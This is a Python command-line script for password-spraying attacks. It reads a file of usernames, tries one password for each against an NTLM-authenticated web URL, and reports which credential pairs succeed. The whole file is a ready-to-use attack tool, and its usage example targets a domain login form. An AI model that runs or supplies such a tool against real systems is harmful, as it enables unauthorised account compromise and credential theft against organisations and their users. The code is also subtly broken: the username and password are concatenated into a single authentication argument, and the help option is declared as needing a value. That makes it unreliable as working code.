import requests 
import requests_ntlm
import sys
import getopt

userfile = ''
fqdn = ''
password = ''
attackurl = ''

def usage():
    print("Usage: sprayer.py -u USERS_FILE -f DC_FQDN -p PASSWORD -a URL_TO_ATTACK")
    print("Example: ")
    print("sprayer.py -u users.txt -f dc.mydomain.com -p password1234 -a http://authForm.mydomain.com/")
    sys.exit(0)

def startSpray(userfile, fqdn, password, attackurl):
    
    HTTP_AUTH_FAIL_CODE = 401
    HTTP_AUTH_SUCCESS_CODE = 200
    
    lines = open(userfile, 'r').readlines()
    users = [line.replace("\r", "").replace("\n", "") for line in lines]
    
    print ("[*] Starting passwords spray attack using the following password: " + password)
    count = 0
    
    for user in users:
        response = requests.get(attackurl, auth=requests_ntlm.HttpNtlmAuth(fqdn + "\\" + user + password))
        if(response.status_code == HTTP_AUTH_SUCCESS_CODE):
            print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if(response.status_code == HTTP_AUTH_FAIL_CODE):
            print("[-] Failed login with Username: " +user)
    print("[*] Password spray attack completed, " +str(count)+ " valid credential pairs found")

def main(argv):
    
    global userfile
    global fqdn
    global password
    global attackurl
    
    #Empty command line options print usage and exits
    if not len(sys.argv[1:]):
        usage()
        
    #Read commad line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:u:f:p:a:", 
                                                ["help", "userfile=", "fqdn=", "password=", "attackurl="])
       
        for option, arg in opts:
            
            if option in ("-h", "--help"):
                usage()
            elif option in ("-u", "--userfile"):
                userfile = arg
            elif option in ("-f", "--fqdn"):
                fqdn = arg
            elif option in ("-p", "--password"):
                password = arg
            elif option in ("-a", "--attackurl"):
                attackurl = arg
            else:
                assert False, "Unhandled option"
            
    except getopt.GetoptError:
        usage()
        
    if (len(userfile) and len(fqdn) and len(password) and len(attackurl)):
        startSpray(userfile, fqdn, password, attackurl)
        sys.exit(0)
    else:
        usage()

main(sys.argv)
